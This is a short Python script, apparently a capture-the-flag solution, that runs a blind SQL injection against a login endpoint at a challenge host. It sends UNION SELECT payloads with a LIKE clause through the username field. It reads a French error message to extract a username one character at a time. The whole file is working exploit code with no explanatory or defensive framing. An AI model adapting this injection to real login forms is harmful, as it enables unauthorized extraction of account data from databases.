import requests
import string

URL = "https://auth10x.chals.ageei.org/validate"

CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + "!@#$^&*-_"

username = "LEGO-"

SQLI_TEMPLATE = "' UNION SELECT username, null, null FROM users WHERE username LIKE '{name}%' -- "

# Function to extract username character by character
def extract_username():
    global username
    while True:
        found = False
        for char in CHARSET:
            test_name = username + char
            print(f"[*] Testing: {test_name}%", end="\r")

            payload = {"username": SQLI_TEMPLATE.format(name=test_name), "password": ""}
            response = requests.post(URL, data=payload)

            if "Identifiants faux !" in response.text:
                username += char
                print(f"\n[✔] Found character: {char}")
                found = True
                break
        
        if not found:
            print("\n[🔥] Username Extraction Complete!")
            break
    
    return username

print("[+] Starting username brute-force extraction...")
final_username = extract_username()
print(f"[🚀] Extracted Username: {final_username}")

